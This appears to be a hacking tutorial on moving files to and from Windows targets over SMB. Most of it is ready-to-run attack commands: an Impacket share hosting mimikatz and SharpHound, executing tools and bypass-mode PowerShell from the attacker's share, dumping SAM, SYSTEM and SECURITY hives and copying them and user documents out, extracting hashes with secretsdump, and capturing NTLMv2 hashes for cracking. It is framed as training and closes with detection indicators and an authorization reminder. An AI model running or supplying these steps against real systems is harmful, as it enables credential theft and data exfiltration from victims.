# 📁 SMB File Transfer — Windows File Sharing for Hackers

## 📖 What Is SMB?

**SMB (Server Message Block)** is the protocol Windows uses for **file sharing**. When you access `\\server\share` in Windows Explorer — that's SMB.

> In ethical hacking, SMB is one of the **fastest and easiest** ways to transfer files to/from Windows targets because it's **built into every Windows machine**.

```text
  ATTACKER (Kali)                          TARGET (Windows)
  ┌──────────────┐    SMB (Port 445)      ┌──────────────┐
  │              │ ◀──────────────────── │              │
  │  SMB Server  │    copy \\IP\share\    │  Windows     │
  │  (Impacket)  │    file.exe C:\Temp    │  (Built-in)  │
  │              │ ──────────────────── ▶ │              │
  │  Hosts files │    Upload/Download     │  No install  │
  │  for target  │                        │  needed!     │
  └──────────────┘                        └──────────────┘
```

---

## 🧠 Why SMB Transfer Is Great

| Advantage | Why |
| --- | --- |
| **No install needed** | SMB client is built into every Windows |
| **Very fast** | Direct file copying |
| **Simple commands** | Just use `copy`, `xcopy`, or Explorer |
| **Two-way** | Upload AND download |
| **Mount as drive** | Map network drive for easy access |

---

## 🛠 Setting Up an SMB Server (Attacker Side)

---

### Method 1: Impacket smbserver.py (Most Common)

```bash
# Basic SMB share (current directory)
impacket-smbserver share $(pwd)

# With SMB2 support (required for Windows 10+)
impacket-smbserver share $(pwd) -smb2support

# With username and password
impacket-smbserver share $(pwd) -smb2support -user hacker -password hacker123
```

**What happens:**

```text
$ impacket-smbserver share $(pwd) -smb2support
Impacket v0.10.0 - Copyright 2022 SecureAuth Corporation

[*] Config file parsed
[*] Callback added for UUID 4B324FC8-1670-01D3-1278-5A47BF6EE188
[*] Callback added for UUID 6BFFD098-A112-3610-9833-46C3F87E345A
[*] Config file parsed
[*] Config file parsed
[*] Config file parsed

# When target accesses your share:
[*] Incoming connection (10.0.0.5,49721)
[*] User CORP\jsmith authenticated successfully
```

---

### Method 2: Samba (Linux Native)

```bash
# Install samba
sudo apt install samba

# Quick share setup
sudo mkdir /tmp/share
sudo chmod 777 /tmp/share

# Edit samba config
sudo nano /etc/samba/smb.conf
```

Add to config:

```ini
[share]
    path = /tmp/share
    browseable = yes
    read only = no
    guest ok = yes
```

```bash
# Restart samba
sudo systemctl restart smbd
```

---

## 📥 Downloading Files (Target Side — Windows)

### Simple Copy

```cmd
:: Copy file from attacker's SMB share
copy \\10.10.14.5\share\mimikatz.exe C:\Temp\mimikatz.exe

:: Copy multiple files
copy \\10.10.14.5\share\*.exe C:\Temp\

:: Xcopy (with subdirectories)
xcopy \\10.10.14.5\share\tools\* C:\Temp\tools\ /E /Y
```

### Map as Network Drive

```cmd
:: Map drive letter
net use Z: \\10.10.14.5\share

:: Map with credentials
net use Z: \\10.10.14.5\share /user:hacker hacker123

:: Access files
dir Z:\
copy Z:\tool.exe C:\Temp\

:: Disconnect when done
net use Z: /delete
```

### Direct Execution (No Copy Needed!)

```cmd
:: Run executable directly from share — never touches disk!
\\10.10.14.5\share\mimikatz.exe

:: Run PowerShell script from share
powershell -ep bypass -File \\10.10.14.5\share\script.ps1
```

### PowerShell

```powershell
# Copy from SMB
Copy-Item \\10.10.14.5\share\tool.exe C:\Temp\

# Create PSDrive
New-PSDrive -Name "Attack" -PSProvider FileSystem -Root "\\10.10.14.5\share"
Copy-Item Attack:\tool.exe C:\Temp\
```

---

## 📤 Uploading Files (Target → Attacker)

### From Target to Attacker's Share

```cmd
:: Copy SAM database to attacker
copy C:\Windows\Temp\SAM \\10.10.14.5\share\SAM
copy C:\Windows\Temp\SYSTEM \\10.10.14.5\share\SYSTEM

:: Copy entire folder
xcopy C:\Users\admin\Documents\* \\10.10.14.5\share\loot\ /E /Y
```

### Upload Registry Hives (For Credential Extraction)

```cmd
:: Save registry hives
reg save HKLM\SAM C:\Temp\SAM
reg save HKLM\SYSTEM C:\Temp\SYSTEM
reg save HKLM\SECURITY C:\Temp\SECURITY

:: Upload to attacker
copy C:\Temp\SAM \\10.10.14.5\share\
copy C:\Temp\SYSTEM \\10.10.14.5\share\
copy C:\Temp\SECURITY \\10.10.14.5\share\
```

**Then on attacker:**

```bash
# Extract password hashes from registry hives
secretsdump.py -sam SAM -system SYSTEM -security SECURITY LOCAL
```

---

## 🔥 Realistic Attack Scenarios

---

### Scenario 1: Upload Tool + Run from Share

```text
SITUATION: Need to run SharpHound on Windows target

ATTACKER:
┌──────────────────────────────────────────────┐
│ # Host SharpHound on SMB share               │
│ cp SharpHound.exe /tmp/share/                │
│ impacket-smbserver share /tmp/share -smb2support │
└──────────────────────────────────────────────┘

TARGET:
┌──────────────────────────────────────────────┐
│ # Run directly from share — no copy needed!  │
│ \\10.10.14.5\share\SharpHound.exe -c All     │
│                                              │
│ # Copy output back to attacker               │
│ copy *.zip \\10.10.14.5\share\               │
└──────────────────────────────────────────────┘

ATTACKER:
┌──────────────────────────────────────────────┐
│ # BloodHound data received!                  │
│ ls /tmp/share/                               │
│ → 20260222_BloodHound.zip                    │
└──────────────────────────────────────────────┘
```

---

### Scenario 2: When SMB Asks for Credentials

Windows 10+ may block unauthenticated SMB access (guest access disabled).

```text
ERROR: "You can't access this shared folder because your
        organization's security policies block unauthenticated
        guest access"
```

**Fix — Use authenticated SMB server:**

```bash
# Attacker: Start authenticated SMB server
impacket-smbserver share /tmp/share -smb2support -user hacker -password hacker123
```

```cmd
:: Target: Connect with credentials
net use Z: \\10.10.14.5\share /user:hacker hacker123
copy Z:\tool.exe C:\Temp\
```

---

### Scenario 3: Capture NTLMv2 Hashes via SMB!

When a Windows machine connects to your SMB server, it **sends its NTLMv2 hash automatically**!

```text
ATTACKER:
┌──────────────────────────────────────────────┐
│ impacket-smbserver share /tmp -smb2support    │
│                                              │
│ # When target connects:                      │
│ [*] User CORP\jsmith authenticated           │
│ [*] NTLMv2 Hash:                             │
│ jsmith::CORP:1122334455:HASH_DATA...         │
│                                              │
│ # Save hash and crack it!                    │
│ hashcat -m 5600 hash.txt rockyou.txt         │
└──────────────────────────────────────────────┘
```

> This is a bonus! Every time a target accesses your SMB share, you get their hash for free.

---

## 📊 SMB Transfer Quick Reference

| Action | Command |
| --- | --- |
| Start SMB server | `impacket-smbserver share $(pwd) -smb2support` |
| Authenticated server | `impacket-smbserver share . -smb2support -user u -password p` |
| Copy from share | `copy \\IP\share\file.exe C:\Temp\` |
| Copy to share | `copy C:\file.txt \\IP\share\` |
| Map drive | `net use Z: \\IP\share` |
| Run from share | `\\IP\share\tool.exe` |
| Disconnect | `net use Z: /delete` |

---

## 🛡 Blue Team — Detection

| Indicator | What to Monitor |
| --- | --- |
| Outbound SMB (445) | Connections to external IPs on port 445 |
| Net use commands | Event ID 4648 (explicit credential logon) |
| Event ID 5140 | Network share accessed |
| Event ID 5145 | Detailed file share access audit |
| UNC path execution | `\\external_IP\share\*.exe` execution |

---

## ⚠ Ethical Reminder

* ✅ Only use on systems with **written authorization**
* ✅ Practice in your own lab
* ❌ Never exfiltrate real data without permission
